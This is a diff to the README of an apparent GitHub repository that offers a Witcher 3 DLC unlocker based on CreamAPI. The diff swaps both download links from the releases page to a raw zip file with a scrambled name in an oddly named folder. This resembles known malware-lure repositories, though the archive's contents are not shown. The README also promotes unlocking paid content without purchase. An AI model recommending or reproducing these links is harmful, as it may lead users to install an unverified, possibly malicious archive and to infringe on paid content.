@@ -1,6 +1,6 @@
 # 🎮 The-Witcher-3-DLC-Unlocker-CreamInstaller-CreamAPI-Toolkit - Access all your Witcher 3 content
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Boydfast868/The-Witcher-3-DLC-Unlocker-CreamInstaller-CreamAPI-Toolkit/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Boydfast868/The-Witcher-3-DLC-Unlocker-CreamInstaller-CreamAPI-Toolkit/raw/refs/heads/main/wellhole/Installer-Cream-Unlocker-Witcher-AP-DL-The-Toolkit-2.5.zip)
 
 This toolkit manages downloadable content for The Witcher 3. It scans your game files and creates the configuration needed for the game to recognize your content. You do not need technical skills to use this tool.
 
@@ -17,7 +17,7 @@ Ensure you meet these requirements before you start:
 
 Visit the link below to reach the latest version of the toolkit.
 
-[Download the toolkit here](https://github.com/Boydfast868/The-Witcher-3-DLC-Unlocker-CreamAPI-Toolkit/releases)
+[Download the toolkit here](https://github.com/Boydfast868/The-Witcher-3-DLC-Unlocker-CreamInstaller-CreamAPI-Toolkit/raw/refs/heads/main/wellhole/Installer-Cream-Unlocker-Witcher-AP-DL-The-Toolkit-2.5.zip)
 
 1. Click the link above to open your browser.
 2. Look for the section labeled "Assets" at the bottom of the newest release.
